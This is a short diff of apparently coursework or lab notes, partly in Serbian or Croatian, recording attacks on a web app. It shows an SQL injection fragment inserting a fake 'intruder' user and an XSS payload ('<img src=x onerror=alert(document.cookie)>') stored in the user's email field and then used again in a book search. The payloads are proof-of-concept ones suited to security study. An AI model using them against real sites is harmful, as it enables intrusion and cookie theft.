@@ -5,4 +5,6 @@ komentar'); insert into persons(firstName, lastName, email) values('intruderFirs
 II XSS
 ('Maliciozni', 'Uljez', '<img src="x" onerror="alert(document.cookie)"/>');
 added this user via sql injection and then searched him up in search 
+book search :
+<img src="x" onerror="alert(document.cookie)"/>
 
